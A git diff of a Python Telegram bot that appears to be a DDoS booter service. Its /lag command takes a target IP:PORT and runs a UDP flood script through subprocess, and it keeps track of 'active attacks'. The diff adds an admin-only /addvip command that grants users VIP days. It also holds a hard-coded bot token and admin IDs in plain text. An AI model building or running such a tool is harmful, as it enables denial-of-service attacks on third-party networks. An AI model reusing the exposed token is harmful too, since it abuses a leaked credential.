@@ -1,20 +1,20 @@
 import telebot
+import subprocess  
 import os
 import signal
-import subprocess
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# Telegram Bot Token
-TOKEN = "7684261013:7684261013:AAFs8GcKQBvF6bQUW3jKEj7lOE-KZpYUjls"
+
+TOKEN = "7684261013:AAFs8GcKQBvF6bQUW3jKEj7lOE-KZpYUjls"
 bot = telebot.TeleBot(TOKEN)
 
-# Allowed Admins to use specific commands
-ALLOWED_USERS = [1480248962]  # Add Admin IDs here
 
-# VIP Users and their remaining days
+ALLOWED_USERS = [8068341198,1480248962]  
+
+
 vip_users = {}
 
-# Active attacks tracking
+
 active_attacks = {}
 
 @bot.message_handler(commands=['start'])
@@ -40,6 +40,33 @@ def handle_start_command(message):
     except Exception as e:
         bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")
 
+@bot.message_handler(commands=['addvip'])
+def handle_addvip_command(message):
+    try:
+        user_id = message.from_user.id
+        if user_id not in ALLOWED_USERS:
+            bot.reply_to(message, "🚫 YOU DO NOT HAVE PERMISSION TO USE THIS COMMAND!")
+            return
+
+        command_parts = message.text.split()
+        if len(command_parts) != 3:
+            bot.reply_to(message, "⚠️ CORRECT USAGE: /ADDVIP <USER_ID> <DAYS>")
+            return
+
+        target_user_id = int(command_parts[1])
+        
+
+        try:
+            days = int(command_parts[2])
+        except ValueError:
+            bot.reply_to(message, "⚠️ INVALID NUMBER OF DAYS. PLEASE ENTER A VALID INTEGER.")
+            return
+
+        vip_users[target_user_id] = days
+        bot.reply_to(message, f"✅ ADDED {days} DAY(S) FOR USER {target_user_id}.")
+    except Exception as e:
+        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")
+
 @bot.message_handler(commands=['lag'])
 def handle_lag_command(message):
     try:
@@ -56,7 +83,7 @@ def handle_lag_command(message):
 
         ip_port = command_parts[1]
 
-        # التأكد من أن المدخل يحتوي على IP:PORT
+
         if ":" not in ip_port:
             bot.reply_to(message, "❌ INVALID FORMAT! PLEASE USE IP:PORT FORMAT.")
             return
@@ -67,9 +94,9 @@ def handle_lag_command(message):
             bot.reply_to(message, "❌ INVALID IP OR PORT. PLEASE CHECK YOUR INPUT.")
             return
 
-        attack_type = "UDP"  # نوع الهجوم الافتراضي
-        threads = "100"  # عدد الـ Threads الافتراضي
-        duration = "900"  # مدة الهجوم الافتراضية بالمللي ثانية
+        attack_type = "UDP"  
+        threads = "1"
+        duration = "900"
 
         command = f'python3 start.py {attack_type} {ip}:{port} {threads} {duration}'
         process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
